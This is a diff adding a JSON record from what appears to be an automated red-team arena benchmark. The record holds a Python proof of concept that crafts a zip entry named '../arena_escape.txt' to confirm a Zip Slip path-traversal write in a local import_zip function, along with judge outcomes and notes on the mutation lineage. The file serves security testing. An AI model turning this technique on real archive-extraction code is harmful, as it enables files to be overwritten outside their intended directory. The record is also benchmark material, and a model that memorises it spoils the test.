@@ -1,0 +1,29 @@
+{
+  "exploit_py": "#!/usr/bin/env python3\n\"\"\"G2 failure-guided crossover Zip Slip proof for battle-004.\n\nExecuted by judge as: python red_exploit_submission.py --expect-vulnerable\nUses only Python standard library, loads local app.py directly from disk, calls\nimport_zip directly, and verifies that a ../ archive entry writes outside the\nchosen destination directory.\n\"\"\"\n\nimport argparse\nimport importlib.util\nimport sys\nimport tempfile\nimport zipfile\nfrom pathlib import Path\n\n\nCONFIRMATION = \"RED_EXPLOIT_CONFIRMED\"\n\n\ndef load_import_zip_from_local_app():\n    app_path = Path.cwd() / \"app.py\"\n    spec = importlib.util.spec_from_file_location(\"battle_local_app\", app_path)\n    if spec is None or spec.loader is None:\n        raise RuntimeError(f\"could not create import spec for {app_path}\")\n    module = importlib.util.module_from_spec(spec)\n    spec.loader.exec_module(module)\n    return getattr(module, \"import_zip\")\n\n\ndef build_zip(zip_path: Path, member_name: str, payload: bytes) -> None:\n    info = zipfile.ZipInfo(member_name)\n    info.compress_type = zipfile.ZIP_STORED\n    with zipfile.ZipFile(zip_path, \"w\") as archive:\n        with archive.open(info, \"w\") as handle:\n            handle.write(payload)\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--expect-vulnerable\", action=\"store_true\")\n    args = parser.parse_args()\n\n    try:\n        import_zip = load_import_zip_from_local_app()\n    except Exception as exc:\n        print(f\"failed to load import_zip from local app.py: {exc}\", file=sys.stderr)\n        return 1 if args.expect_vulnerable else 0\n\n    member_name = \"../arena_escape.txt\"\n    payload = b\"RED_EXPLOIT_CONFIRMED zip slip payload\\n\"\n\n    with tempfile.TemporaryDirectory() as tmp:\n        base = Path(tmp).resolve()\n        destination = base / \"workspace\"\n        zip_path = base / \"crafted.zip\"\n        expected_escape = base / \"arena_escape.txt\"\n\n        build_zip(zip_path, member_name, payload)\n\n        try:\n            written = import_zip(zip_path, destination)\n        except Exception as exc:\n            if args.expect_vulnerable:\n                print(f\"import_zip raised unexpectedly: {exc}\", file=sys.stderr)\n                return 1\n            return 0\n\n        try:\n            dest_resolved = destination.resolve()\n            escape_resolved = expected_escape.resolve()\n            escaped_outside_destination = not escape_resolved.is_relative_to(dest_resolved)\n        except AttributeError:\n            dest_resolved = destination.resolve()\n            escape_resolved = expected_escape.resolve()\n            try:\n                escape_resolved.relative_to(dest_resolved)\n                escaped_outside_destination = False\n            except ValueError:\n                escaped_outside_destination = True\n\n        content_matches = expected_escape.is_file() and expected_escape.read_bytes() == payload\n        returned_escape_path = any(Path(item).resolve() == escape_resolved for item in written)\n\n        if escaped_outside_destination and content_matches and returned_escape_path:\n            print(CONFIRMATION)\n            return 0\n\n        if args.expect_vulnerable:\n            print(\"Zip Slip write outside destination was not confirmed\", file=sys.stderr)\n            print(f\"destination={destination}\", file=sys.stderr)\n            print(f\"expected_escape={expected_escape}\", file=sys.stderr)\n            print(f\"exists={expected_escape.exists()}\", file=sys.stderr)\n            print(f\"written={written!r}\", file=sys.stderr)\n            return 1\n\n        return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+  "inputs": {
+    "g1a_outcome": {
+      "duration_seconds": 1.188234,
+      "patched_bypass": false,
+      "vulnerable_original_confirmed": true
+    },
+    "g1b_outcome": {
+      "duration_seconds": 1.180406,
+      "patched_bypass": false,
+      "vulnerable_original_confirmed": true
+    },
+    "selected_g1_evidence_packet_ref": "arena-adaptive-lineage-20260718T173726Z:battle.parent_evidence_packet.v1:G1-A",
+    "selected_g1_id": "G1-A",
+    "selection_receipt_ref": "arena-adaptive-lineage-20260718T173726Z-lineage-selection"
+  },
+  "judge_attempts": 1,
+  "judge_outcome": {
+    "duration_seconds": 1.14534,
+    "patched_bypass": false,
+    "vulnerable_original_confirmed": true
+  },
+  "mutation_operator": "failure_guided_crossover",
+  "parent_evidence_packet_ref": "arena-adaptive-lineage-20260718T173726Z:battle.parent_evidence_packet.v1:G1-A",
+  "source_sha256": "c882c312119c4765f7392126ad6632b0027ec8acd8dc258ea572260ab7e6802e",
+  "specimen_id": "G2",
+  "technique_delta": "Changes app loading from importlib.import_module to importlib.util.spec_from_file_location, changes archive creation from writestr to ZipInfo plus open/write, changes the call to pass Path objects, and strengthens the oracle with read-back plus returned-path resolution."
+}
